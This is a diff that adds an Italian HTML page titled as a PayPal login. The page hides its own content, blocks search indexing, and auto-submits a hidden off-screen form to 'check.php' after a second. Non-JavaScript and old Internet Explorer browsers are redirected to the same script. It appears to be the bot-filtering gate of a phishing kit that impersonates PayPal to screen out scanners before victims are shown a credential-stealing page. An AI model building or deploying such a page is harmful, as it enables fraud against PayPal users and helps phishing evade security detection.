@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+    <title>Accedi al tuo conto PayPal</title>
+    <style>
+        body { display: none; }
+    </style>
+    <noscript>
+        <meta http-equiv="refresh" content="1;url=check.php">
+    </noscript>
+</head>
+<body>
+
+<form action="check.php" method="POST" style="position:absolute; left:-9999px;">
+    <input type="text" name="hp_field" autocomplete="off">
+</form>
+
+<script>
+    // Invio automatico del form honeypot dopo 1 secondo
+    setTimeout(function(){
+        document.forms[0].submit();
+    }, 1000);
+
+    // Redirect immediato per IE obsoleti
+    if(window.document.documentMode) {
+        document.write('<meta http-equiv="refresh" content="1;url=check.php">');
+    }
+</script>
+
+<noscript>
+    <div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;">
+        <h1>Abilita JavaScript per continuare</h1>
+        <p>Questa pagina richiede JavaScript per verificare il browser.</p>
+    </div>
+</noscript>
+
+</body>
+</html>
